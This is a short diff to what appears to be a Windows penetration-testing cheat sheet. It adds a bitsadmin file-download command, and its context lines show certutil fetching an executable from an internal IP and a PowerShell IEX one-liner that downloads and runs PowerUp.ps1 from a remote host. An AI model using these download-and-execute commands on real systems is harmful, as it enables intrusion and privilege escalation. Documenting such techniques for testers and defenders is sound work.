@@ -250,6 +250,10 @@ Oneliner method to extract wifi passwords from all the access point.
 
 `certutil.exe -urlcache -split -f "http://10.9.3.23/Advanced.exe" Advanced.exe`
 
+#### Use bitsadmin to download from web
+
+`bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip`
+
 #### Windows Powershell download from web
 
 `powershell "IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')"`
